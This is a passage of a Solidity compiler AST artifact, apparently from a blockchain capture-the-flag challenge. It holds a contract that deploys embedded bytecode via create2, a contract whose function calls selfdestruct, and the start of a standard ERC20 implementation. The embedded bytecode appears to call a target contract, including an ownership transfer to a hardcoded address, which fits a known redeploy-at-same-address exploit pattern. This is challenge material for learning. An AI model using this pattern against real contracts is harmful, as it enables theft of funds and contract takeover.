												"name": "onlyOwner",
												"nodeType": "Identifier",
												"overloadedDeclarations": [],
												"referencedDeclaration": 62,
												"src": "5015:9:0",
												"typeDescriptions": {
													"typeIdentifier": "t_modifier$__$",
													"typeString": "modifier ()"
												}
											},
											"nodeType": "ModifierInvocation",
											"src": "5015:9:0"
										}
									],
									"name": "finish",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 503,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "5005:2:0"
									},
									"returnParameters": {
										"id": 508,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 507,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 543,
												"src": "5034:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 506,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "5034:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5033:6:0"
									},
									"scope": 544,
									"src": "4990:239:0",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "public"
								}
							],
							"scope": 588,
							"src": "2509:2723:0"
						},
						{
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 576,
							"linearizedBaseContracts": [
								576
							],
							"name": "deployed",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"id": 547,
									"name": "contractBytecode",
									"nodeType": "VariableDeclaration",
									"scope": 576,
									"src": "5263:5146:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_bytes_storage",
										"typeString": "bytes"
									},
									"typeName": {
										"id": 545,
										"name": "bytes",
										"nodeType": "ElementaryTypeName",
										"src": "5263:5:0",
										"typeDescriptions": {
											"typeIdentifier": "t_bytes_storage_ptr",
											"typeString": "bytes"
										}
									},
									"value": {
										"argumentTypes": null,
										"hexValue": "60806040526109eb806100136000396000f3fe6080604052600436106100915760003560e01c8063a6f2ae3a11610059578063a6f2ae3a1461027e578063d56b288914610295578063df05f42e146102ac578063ead4d3db146102c3578063f9dca989146102f257610091565b806306661abd1461017457806319ab453c146101a35780632f54bf6e146101e757806345710074146102505780637e10e9d114610267575b600060149054906101000a900460ff16610172576001600060146101000a81548160ff0219169083151502179055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e4849b3260c86040518263ffffffff1660e01b815260040180828152602001915050602060405180830381600087803b15801561013557600080fd5b505af1158015610149573d6000803e3d6000fd5b505050506040513d602081101561015f57600080fd5b8101908080519060200190929190505050505b005b34801561018057600080fd5b50610189610309565b604051808215151515815260200191505060405180910390f35b6101e5600480360360208110156101b957600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061031c565b005b3480156101f357600080fd5b506102366004803603602081101561020a57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061035f565b604051808215151515815260200191505060405180910390f35b34801561025c57600080fd5b506102656103bc565b005b34801561027357600080fd5b5061027c61046f565b005b34801561028a57600080fd5b5061029361064a565b005b3480156102a157600080fd5b506102aa6106f3565b005b3480156102b857600080fd5b506102c161079a565b005b3480156102cf57600080fd5b506102d8610868565b604051808215151515815260200191505060405180910390f35b3480156102fe57600080fd5b5061030761087b565b005b600060149054906101000a900460ff1681565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b60008060159054906101000a900460ff16610398576001600060156101000a81548160ff021916908315150217905550600090506103b7565b60008060156101000a81548160ff021916908315150217905550600190505b919050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e4849b3260c86040518263ffffffff1660e01b815260040180828152602001915050602060405180830381600087803b15801561043157600080fd5b505af1158015610445573d6000803e3d6000fd5b505050506040513d602081101561045b57600080fd5b810190808051906020019092919050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c03646ba306040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050602060405180830381600087803b15801561050f57600080fd5b505af1158015610523573d6000803e3d6000fd5b505050506040513d602081101561053957600080fd5b8101908080519060200190929190505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c03646ba6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050602060405180830381600087803b15801561060c57600080fd5b505af1158015610620573d6000803e3d6000fd5b505050506040513d602081101561063657600080fd5b810190808051906020019092919050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a6f2ae3a60016040518263ffffffff1660e01b81526004016020604051808303818588803b1580156106b457600080fd5b505af11580156106c8573d6000803e3d6000fd5b50505050506040513d60208110156106df57600080fd5b810190808051906020019092919050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d56b28896040518163ffffffff1660e01b8152600401602060405180830381600087803b15801561075c57600080fd5b505af1158015610770573d6000803e3d6000fd5b505050506040513d602081101561078657600080fd5b810190808051906020019092919050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663f2fde38b73220866b1a2219f40e72f5c628b65d54268ca3a9d6040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050600060405180830381600087803b15801561084e57600080fd5b505af1158015610862573d6000803e3d6000fd5b50505050565b600060159054906101000a900460ff1681565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166351ec819f306040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050600060405180830381600087803b15801561091b57600080fd5b505af115801561092f573d6000803e3d6000fd5b505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166362a094776040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561099c57600080fd5b505af11580156109b0573d6000803e3d6000fd5b5050505056fea265627a7a72315820490de0313b1ad79570c77ae043ce5fe65f40e32cd15657be89fd034ab9e52c2464736f6c63430005110032",
										"id": 546,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "string",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "5288:5121:0",
										"subdenomination": null,
										"typeDescriptions": {
											"typeIdentifier": "t_stringliteral_4c860f020c00fbfdd70a1107a62bbb12045eac8dc19c5bf6e8411d5a5d3efce8",
											"typeString": "literal_string (contains invalid UTF-8 sequence at position 1)"
										},
										"value": null
									},
									"visibility": "internal"
								},
								{
									"body": {
										"id": 564,
										"nodeType": "Block",
										"src": "10470:189:0",
										"statements": [
											{
												"assignments": [
													555
												],
												"declarations": [
													{
														"constant": false,
														"id": 555,
														"name": "bytecode",
														"nodeType": "VariableDeclaration",
														"scope": 564,
														"src": "10477:21:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes"
														},
														"typeName": {
															"id": 554,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "10477:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 557,
												"initialValue": {
													"argumentTypes": null,
													"id": 556,
													"name": "contractBytecode",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 547,
													"src": "10501:16:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_storage",
														"typeString": "bytes storage ref"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "10477:40:0"
											},
											{
												"assignments": [
													559
												],
												"declarations": [
													{
														"constant": false,
														"id": 559,
														"name": "addr",
														"nodeType": "VariableDeclaration",
														"scope": 564,
														"src": "10524:12:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														},
														"typeName": {
															"id": 558,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "10524:7:0",
															"stateMutability": "nonpayable",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 560,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "10524:12:0"
											},
											{
												"externalReferences": [
													{
														"bytecode": {
															"declaration": 555,
															"isOffset": false,
															"isSlot": false,
															"src": "10592:8:0",
															"valueSize": 1
														}
													},
													{
														"addr": {
															"declaration": 559,
															"isOffset": false,
															"isSlot": false,
															"src": "10569:4:0",
															"valueSize": 1
														}
													},
													{
														"bytecode": {
															"declaration": 555,
															"isOffset": false,
															"isSlot": false,
															"src": "10615:8:0",
															"valueSize": 1
														}
													},
													{
														"salt": {
															"declaration": 549,
															"isOffset": false,
															"isSlot": false,
															"src": "10626:4:0",
															"valueSize": 1
														}
													}
												],
												"id": 561,
												"nodeType": "InlineAssembly",
												"operations": "{\n    addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt)\n}",
												"src": "10551:87:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 562,
													"name": "addr",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 559,
													"src": "10651:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"functionReturnParameters": 553,
												"id": 563,
												"nodeType": "Return",
												"src": "10644:11:0"
											}
										]
									},
									"documentation": null,
									"id": 565,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "deploy",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 550,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 549,
												"name": "salt",
												"nodeType": "VariableDeclaration",
												"scope": 565,
												"src": "10432:12:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes32",
													"typeString": "bytes32"
												},
												"typeName": {
													"id": 548,
													"name": "bytes32",
													"nodeType": "ElementaryTypeName",
													"src": "10432:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "10431:14:0"
									},
									"returnParameters": {
										"id": 553,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 552,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 565,
												"src": "10461:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 551,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "10461:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "10460:9:0"
									},
									"scope": 576,
									"src": "10416:243:0",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 574,
										"nodeType": "Block",
										"src": "10711:57:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 571,
															"name": "contractBytecode",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 547,
															"src": "10739:16:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage",
																"typeString": "bytes storage ref"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes_storage",
																"typeString": "bytes storage ref"
															}
														],
														"id": 570,
														"name": "keccak256",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1235,
														"src": "10729:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_keccak256_pure$_t_bytes_memory_ptr_$returns$_t_bytes32_$",
															"typeString": "function (bytes memory) pure returns (bytes32)"
														}
													},
													"id": 572,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "10729:27:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"functionReturnParameters": 569,
												"id": 573,
												"nodeType": "Return",
												"src": "10722:34:0"
											}
										]
									},
									"documentation": null,
									"id": 575,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "getHash",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 566,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "10681:2:0"
									},
									"returnParameters": {
										"id": 569,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 568,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 575,
												"src": "10703:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes32",
													"typeString": "bytes32"
												},
												"typeName": {
													"id": 567,
													"name": "bytes32",
													"nodeType": "ElementaryTypeName",
													"src": "10703:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "10702:9:0"
									},
									"scope": 576,
									"src": "10665:103:0",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "public"
								}
							],
							"scope": 588,
							"src": "5234:5537:0"
						},
						{
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 587,
							"linearizedBaseContracts": [
								587
							],
							"name": "self",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": {
										"id": 585,
										"nodeType": "Block",
										"src": "10844:38:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 582,
															"name": "_addr",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 578,
															"src": "10868:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														],
														"id": 581,
														"name": "selfdestruct",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1249,
														"src": "10855:12:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_selfdestruct_nonpayable$_t_address_payable_$returns$__$",
															"typeString": "function (address payable)"
														}
													},
													"id": 583,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "10855:19:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 584,
												"nodeType": "ExpressionStatement",
												"src": "10855:19:0"
											}
										]
									},
									"documentation": null,
									"id": 586,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "selfd",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 579,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 578,
												"name": "_addr",
												"nodeType": "VariableDeclaration",
												"scope": 586,
												"src": "10808:21:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address_payable",
													"typeString": "address payable"
												},
												"typeName": {
													"id": 577,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "10808:15:0",
													"stateMutability": "payable",
													"typeDescriptions": {
														"typeIdentifier": "t_address_payable",
														"typeString": "address payable"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "10807:23:0"
									},
									"returnParameters": {
										"id": 580,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "10844:0:0"
									},
									"scope": 587,
									"src": "10793:89:0",
									"stateMutability": "payable",
									"superFunction": null,
									"visibility": "public"
								}
							],
							"scope": 588,
							"src": "10773:112:0"
						}
					],
					"src": "39:11770:0"
				},
				"id": 0
			},
			"赛题-预赛/第四题/contracts/ERC20.sol": {
				"ast": {
					"absolutePath": "赛题-预赛/第四题/contracts/ERC20.sol",
					"exportedSymbols": {
						"ERC20": [
							966
						]
					},
					"id": 967,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 589,
							"literals": [
								"solidity",
								"^",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "0:23:1"
						},
						{
							"absolutePath": "赛题-预赛/第四题/contracts/IERC20.sol",
							"file": "./IERC20.sol",
							"id": 590,
							"nodeType": "ImportDirective",
							"scope": 967,
							"sourceUnit": 1094,
							"src": "27:22:1",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "赛题-预赛/第四题/contracts/SafeMath.sol",
							"file": "./SafeMath.sol",
							"id": 591,
							"nodeType": "ImportDirective",
							"scope": 967,
							"sourceUnit": 1227,
							"src": "51:24:1",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"baseContracts": [
								{
									"arguments": null,
									"baseName": {
										"contractScope": null,
										"id": 592,
										"name": "IERC20",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 1093,
										"src": "1274:6:1",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_IERC20_$1093",
											"typeString": "contract IERC20"
										}
									},
									"id": 593,
									"nodeType": "InheritanceSpecifier",
									"src": "1274:6:1"
								}
							],
							"contractDependencies": [
								1093
							],
							"contractKind": "contract",
							"documentation": "@dev Implementation of the {IERC20} interface.\n\n * This implementation is agnostic to the way tokens are created. This means\nthat a supply mechanism has to be added in a derived contract using {_mint}.\nFor a generic mechanism see {ERC20Mintable}.\n\n * TIP: For a detailed writeup see our guide\nhttps://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How\nto implement supply mechanisms].\n\n * We have followed general OpenZeppelin guidelines: functions revert instead\nof returning `false` on failure. This behavior is nonetheless conventional\nand does not conflict with the expectations of ERC20 applications.\n\n * Additionally, an {Approval} event is emitted on calls to {transferFrom}.\nThis allows applications to reconstruct the allowance for all accounts just\nby listening to said events. Other implementations of the EIP may not emit\nthese events, as it isn't required by the specification.\n\n * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}\nfunctions have been added to mitigate the well-known issues around setting\nallowances. See {IERC20-approve}.",
							"fullyImplemented": true,
							"id": 966,
							"linearizedBaseContracts": [
								966,
								1093
							],
							"name": "ERC20",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"id": 596,
									"libraryName": {
										"contractScope": null,
										"id": 594,
										"name": "SafeMath",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 1226,
										"src": "1294:8:1",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_SafeMath_$1226",
											"typeString": "library SafeMath"
										}
									},
									"nodeType": "UsingForDirective",
									"src": "1288:27:1",
									"typeName": {
										"id": 595,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "1307:7:1",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									}
								},
								{
									"constant": false,
									"id": 600,
									"name": "_balances",
									"nodeType": "VariableDeclaration",
									"scope": 966,
									"src": "1323:47:1",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
										"typeString": "mapping(address => uint256)"
									},
									"typeName": {
										"id": 599,
										"keyType": {
											"id": 597,
											"name": "address",
											"nodeType": "ElementaryTypeName",
											"src": "1332:7:1",
											"typeDescriptions": {
												"typeIdentifier": "t_address",
												"typeString": "address"
											}
										},
										"nodeType": "Mapping",
										"src": "1323:28:1",
										"typeDescriptions": {
											"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
											"typeString": "mapping(address => uint256)"
										},
										"valueType": {
											"id": 598,
											"name": "uint256",
											"nodeType": "ElementaryTypeName",
											"src": "1343:7:1",
											"typeDescriptions": {
												"typeIdentifier": "t_uint256",
												"typeString": "uint256"
											}
										}
									},
									"value": null,
									"visibility": "internal"
								},
								{
									"constant": false,
									"id": 606,
									"name": "_allowances",
									"nodeType": "VariableDeclaration",
									"scope": 966,
									"src": "1379:70:1",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_mapping$_t_address_$_t_mapping$_t_address_$_t_uint256_$_$",
										"typeString": "mapping(address => mapping(address => uint256))"
									},
									"typeName": {
										"id": 605,
										"keyType": {
											"id": 601,
											"name": "address",
											"nodeType": "ElementaryTypeName",
											"src": "1388:7:1",
											"typeDescriptions": {
												"typeIdentifier": "t_address",
												"typeString": "address"
											}
										},
										"nodeType": "Mapping",
										"src": "1379:49:1",
										"typeDescriptions": {
											"typeIdentifier": "t_mapping$_t_address_$_t_mapping$_t_address_$_t_uint256_$_$",
											"typeString": "mapping(address => mapping(address => uint256))"
										},
										"valueType": {
											"id": 604,
											"keyType": {
												"id": 602,
												"name": "address",
												"nodeType": "ElementaryTypeName",
												"src": "1408:7:1",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												}
											},
											"nodeType": "Mapping",
											"src": "1399:28:1",
											"typeDescriptions": {
												"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
												"typeString": "mapping(address => uint256)"
											},
											"valueType": {
												"id": 603,
												"name": "uint256",
												"nodeType": "ElementaryTypeName",
												"src": "1419:7:1",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												}
											}
										}
									},
									"value": null,
									"visibility": "internal"
								},
								{
									"constant": false,
									"id": 608,
									"name": "_totalSupply",
									"nodeType": "VariableDeclaration",
									"scope": 966,
									"src": "1458:29:1",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 607,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "1458:7:1",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": null,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 615,
										"nodeType": "Block",
										"src": "1612:38:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 613,
													"name": "_totalSupply",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 608,
													"src": "1630:12:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 612,
												"id": 614,
												"nodeType": "Return",
												"src": "1623:19:1"
											}
										]
									},
									"documentation": "@dev See {IERC20-totalSupply}.",
									"id": 616,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "totalSupply",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 609,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1579:2:1"
									},
									"returnParameters": {
										"id": 612,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 611,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 616,
												"src": "1603:7:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 610,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1603:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1602:9:1"
									},
									"scope": 966,
									"src": "1559:91:1",
									"stateMutability": "view",
									"superFunction": 1031,
									"visibility": "public"
								},
								{
									"body": {
										"id": 627,
										"nodeType": "Block",
										"src": "1779:44:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"baseExpression": {
														"argumentTypes": null,
														"id": 623,
														"name": "_balances",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 600,
														"src": "1797:9:1",
														"typeDescriptions": {
															"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
															"typeString": "mapping(address => uint256)"
														}
													},
													"id": 625,
													"indexExpression": {
														"argumentTypes": null,
														"id": 624,
														"name": "account",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 618,
														"src": "1807:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"isConstant": false,
													"isLValue": true,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "IndexAccess",
													"src": "1797:18:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 622,
												"id": 626,
												"nodeType": "Return",
												"src": "1790:25:1"
											}
										]
									},
									"documentation": "@dev See {IERC20-balanceOf}.",
									"id": 628,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "balanceOf",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 619,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 618,
												"name": "account",
												"nodeType": "VariableDeclaration",
												"scope": 628,
												"src": "1732:15:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 617,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1732:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1731:17:1"
									},
									"returnParameters": {
										"id": 622,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 621,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 628,
												"src": "1770:7:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 620,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1770:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1769:9:1"
									},
									"scope": 966,
									"src": "1713:110:1",
									"stateMutability": "view",
									"superFunction": 1038,
									"visibility": "public"
								},
								{
									"body": {
										"id": 646,
										"nodeType": "Block",
										"src": "2111:81:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 638,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1241,
																"src": "2132:3:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 639,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "2132:10:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														{
															"argumentTypes": null,
															"id": 640,
															"name": "recipient",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 630,
															"src": "2144:9:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 641,
															"name": "amount",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 632,
															"src": "2155:6:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 637,
														"name": "_transfer",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 809,
														"src": "2122:9:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 642,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2122:40:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 643,
												"nodeType": "ExpressionStatement",
												"src": "2122:40:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "74727565",
													"id": 644,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "bool",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "2180:4:1",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
